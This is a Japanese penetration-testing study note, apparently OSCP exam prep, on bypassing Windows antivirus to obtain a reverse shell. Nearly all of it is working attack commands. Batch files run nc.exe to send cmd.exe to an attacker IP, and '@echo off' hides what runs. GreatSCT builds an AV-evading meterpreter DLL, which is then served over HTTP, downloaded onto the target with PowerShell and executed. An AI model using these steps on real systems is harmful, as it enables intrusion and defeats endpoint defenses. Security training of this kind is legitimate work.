- 関連ノート：
	- [Web攻撃の難読化](Web攻撃の難読化.md)
- 参考🔗：[HackTricks - AV Bypass](https://book.hacktricks.wiki/en/windows-hardening/av-bypass.html)

>[!Note]
>AVの回避はOSCP試験において主眼ではなかったため、簡素な内容にとどめる。
>しかし、現実のテストやこの後のOSEPでは非常に重要なテクニックなので、今後充実化していく。

---

# Anti Virus - Windows

目的：Windowsマシンからリバースシェルを獲得する

> [!TIP] 
> EXEよりもDLLのほうがAV回避の成功確率が高い

## バッチファイル（bat）

リバースシェル用バッチファイルの作成
```cmd
echo <path_to_nc.exe> -e cmd <attacker_IP> <port> > shell.bat
```

バッチファイルで、コマンドの内容を表示せず実行させる
```cmd
@echo off
c:\temp\nc.exe <attacker_IP> <port> -e cmd.exe
```

> [!NOTE]
> `@echo off` を先頭に付けることで、実行時にコマンド内容がコンソールに表示されなくなる

## DLL w/ GreatSCT

meterpreterシェルを獲得するAV bypassペイロードを作成する。

### 攻撃者のマシン（Kali）

1. GreatSCTのインストール
```zsh
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/
cd setup
sudo ./setup.sh -c
cd ../
```

2. ペイロードの作成
```zsh
sudo ./GreatSCT.py --ip <attacker_IP> --port <port> -t bypass -p regsvcs/meterpreter/rev_tcp.py -o <output_filename>
```

> [!TIP] 
>- 出力に以下の情報が含まれるのでよく確認すること：
>	- `DLL written to:` → 生成されたDLLの格納パス
>	- `Metasploit RC file written to:` → msfconsoleで使うRCファイルのパス
>	- `Execute with:` → ターゲット上での実行コマンド

3. ペイロードの転送用サーバを立てる
```zsh
cd <path_to_dll_dir>  # DLL written to: の値のフォルダまで指定
sudo python3 -m http.server 80
```

4. meterpreterリスナーを起動（セッションはまだ未作成）
```zsh
msfconsole -r <path_to_rc_file>  # Metasploit RC file written to: の値
```

### ターゲットマシン（Windows）

5. ペイロードのダウンロード
```cmd
powershell -command Invoke-WebRequest -Uri 'http://<attacker_IP>:<port>/<payload_filename>' -OutFile 'C:\Temp\<payload_filename>'
```

6. バッチファイル化
```cmd
cmd /c "echo <execute_with_value> > C:\Temp\<filename>.bat"
```

7. バッチファイルの実行
```cmd
C:\Temp\<filename>.bat
```
